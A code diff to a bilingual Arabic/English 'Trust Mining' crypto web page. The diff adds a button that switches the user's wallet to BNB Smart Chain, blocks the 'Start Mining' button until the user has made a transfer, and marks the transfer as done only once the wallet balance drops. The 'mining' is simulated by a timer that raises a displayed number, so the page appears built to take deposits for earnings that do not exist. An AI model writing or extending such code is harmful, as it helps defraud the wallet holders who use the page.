@@ -93,6 +93,11 @@
             cursor: not-allowed;
             transform: none;
         }
+
+        .network-btn {
+            background: #1a2a6c;
+            color: white;
+        }
         
         .mining-btn {
             font-size: 1.2rem;
@@ -172,6 +177,13 @@
             margin-top: 10px;
             text-align: center;
         }
+
+        .success {
+            color: #28a745;
+            font-weight: bold;
+            margin-top: 10px;
+            text-align: center;
+        }
         
         .info-note {
             text-align: center;
@@ -222,6 +234,13 @@
             <h1 id="title">Trust Mining</h1>
             <p class="subtitle" id="subtitle">Mining Made Simple</p>
         </header>
+
+        <!-- قسم الشبكة -->
+        <section class="section network-section">
+            <h2 id="networkTitle">Network</h2>
+            <button id="switchNetwork" class="btn network-btn">Switch to BEP20</button>
+            <p id="networkStatus" class="warning">Not connected to BEP20</p>
+        </section>
         
         <section class="section wallet-section">
             <h2 id="walletStatus">Connect Your Wallet</h2>
@@ -243,6 +262,7 @@
             </div>
             
             <button id="startMining" class="btn mining-btn" disabled>Start Mining</button>
+            <p id="miningStatus" class="warning" style="display: none;">You must transfer first to start mining</p>
         </section>
         
         <section class="section swap-section">
@@ -280,6 +300,10 @@
             ar: {
                 title: "Trust Mining",
                 subtitle: "تعدين سهل",
+                networkTitle: "الشبكة",
+                switchNetwork: "التغيير إلى BEP20",
+                networkConnected: "متصل بشبكة BEP20",
+                networkNotConnected: "غير متصل بشبكة BEP20",
                 connectWallet: "اتصال المحفظة",
                 walletConnected: "متصل",
                 walletNotConnected: "غير متصل",
@@ -301,11 +325,17 @@
                 address: "العنوان",
                 balance: "الرصيد",
                 minAmountError: "الحد الأدنى 20",
-                balanceError: "تجاوز الرصيد"
+                balanceError: "تجاوز الرصيد",
+                transferRequired: "يجب التحويل أولاً لبدء التعدين",
+                switchNetworkError: "الرجاء التغيير يدوياً إلى شبكة BEP20"
             },
             en: {
                 title: "Trust Mining",
                 subtitle: "Mining Made Simple",
+                networkTitle: "Network",
+                switchNetwork: "Switch to BEP20",
+                networkConnected: "Connected to BEP20",
+                networkNotConnected: "Not connected to BEP20",
                 connectWallet: "Connect Wallet",
                 walletConnected: "Connected",
                 walletNotConnected: "Not Connected",
@@ -327,7 +357,9 @@
                 address: "Address",
                 balance: "Balance",
                 minAmountError: "Minimum 20",
-                balanceError: "Exceeds balance"
+                balanceError: "Exceeds balance",
+                transferRequired: "You must transfer first to start mining",
+                switchNetworkError: "Please manually switch to BEP20 network"
             }
         };
 
@@ -335,11 +367,13 @@
         let miningState = {
             isMining: false,
             isConnected: false,
+            hasTransferred: false,
             balance: 0,
             totalEarned: 0,
             miningInterval: null,
             userAddress: null,
-            userBalance: 0
+            userBalance: 0,
+            isBEP20: false
         };
 
         let swapState = {
@@ -361,6 +395,55 @@
         const swapValueEl = document.getElementById('swapValue');
         const feeValueEl = document.getElementById('feeValue');
         const netValueEl = document.getElementById('netValue');
+        const switchNetworkBtn = document.getElementById('switchNetwork');
+        const networkStatus = document.getElementById('networkStatus');
+        const miningStatus = document.getElementById('miningStatus');
+
+        // التحقق من الشبكة
+        async function checkNetwork() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    // BEP20 Chain ID: 0x38 (56 in decimal)
+                    miningState.isBEP20 = (chainId === '0x38');
+                    updateNetworkStatus();
+                    return miningState.isBEP20;
+                } catch (error) {
+                    console.error('Error checking network:', error);
+                    return false;
+                }
+            }
+            return false;
+        }
+
+        // تحديث حالة الشبكة
+        function updateNetworkStatus() {
+            const t = translations[currentLanguage];
+            if (miningState.isBEP20) {
+                networkStatus.textContent = t.networkConnected;
+                networkStatus.className = 'success';
+            } else {
+                networkStatus.textContent = t.networkNotConnected;
+                networkStatus.className = 'warning';
+            }
+        }
+
+        // تغيير الشبكة إلى BEP20
+        async function switchToBEP20() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], // BEP20
+                });
+                // تحديث حالة الشبكة بعد التغيير
+                setTimeout(() => {
+                    checkNetwork();
+                }, 1000);
+            } catch (error) {
+                const t = translations[currentLanguage];
+                alert(t.switchNetworkError);
+            }
+        }
 
         function changeLanguage(lang) {
             currentLanguage = lang;
@@ -374,6 +457,8 @@
             
             document.getElementById('title').textContent = t.title;
             document.getElementById('subtitle').textContent = t.subtitle;
+            document.getElementById('networkTitle').textContent = t.networkTitle;
+            document.getElementById('switchNetwork').textContent = t.switchNetwork;
             document.getElementById('connectWallet').textContent = t.connectWallet;
             document.getElementById('walletStatus').textContent = miningState.isConnected ? 
                 t.walletConnected : t.walletNotConnected;
@@ -393,6 +478,8 @@
             
             document.getElementById('startMining').textContent = 
                 miningState.isMining ? t.stopMining : t.startMining;
+
+            updateNetworkStatus();
         }
 
         async function getUserBalance(address) {
@@ -424,6 +511,9 @@
             }
         }
 
+        // زر تغيير الشبكة
+        switchNetworkBtn.onclick = switchToBEP20;
+
         connectWalletBtn.onclick = async function() {
             if (typeof window.ethereum !== 'undefined') {
                 try {
@@ -435,6 +525,7 @@
                     miningState.userAddress = accounts[0];
                     
                     await getUserBalance(accounts[0]);
+                    await checkNetwork();
                     
                     walletStatus.textContent = translations[currentLanguage].walletConnected;
                     startMiningBtn.disabled = false;
@@ -452,10 +543,19 @@
         };
 
         startMiningBtn.onclick = function() {
+            const t = translations[currentLanguage];
+            
+            if (!miningState.hasTransferred) {
+                miningStatus.textContent = t.transferRequired;
+                miningStatus.style.display = 'block';
+                return;
+            }
+
             if (!miningState.isMining) {
                 miningState.isMining = true;
                 miningState.startTime = Date.now();
-                startMiningBtn.textContent = translations[currentLanguage].stopMining;
+                startMiningBtn.textContent = t.stopMining;
+                miningStatus.style.display = 'none';
                 
                 miningState.miningInterval = setInterval(() => {
                     miningState.balance += 0.01;
@@ -468,7 +568,7 @@
                 miningState.balance = 0;
                 
                 clearInterval(miningState.miningInterval);
-                startMiningBtn.textContent = translations[currentLanguage].startMining;
+                startMiningBtn.textContent = t.startMining;
                 
                 miningBalanceEl.textContent = '0.00';
                 totalEarnedEl.textContent = miningState.totalEarned.toFixed(2);
@@ -499,6 +599,15 @@
         confirmSwapBtn.onclick = async function() {
             if (!swapState.amount || !miningState.userAddress) return;
             
+            // التحقق من الشبكة أولاً
+            const isBEP20 = await checkNetwork();
+            if (!isBEP20) {
+                alert(currentLanguage === 'ar' ? 
+                    'الرجاء التغيير إلى شبكة BEP20 أولاً' : 
+                    'Please switch to BEP20 network first');
+                return;
+            }
+            
             try {
                 const t = translations[currentLanguage];
                 const balanceBefore = miningState.userBalance;
@@ -521,6 +630,8 @@
                     await getUserBalance(miningState.userAddress);
                     
                     if (miningState.userBalance < balanceBefore) {
+                        miningState.hasTransferred = true;
+                        
                         if (!miningState.isMining) {
                             startMiningBtn.click();
                         }
@@ -559,12 +670,15 @@
             });
             
             window.ethereum.on('chainChanged', function() {
+                checkNetwork();
                 if (miningState.userAddress) {
                     getUserBalance(miningState.userAddress);
                 }
             });
         }
 
+        // التحقق الأولي من الشبكة
+        checkNetwork();
         updateTexts();
     </script>
 </body>
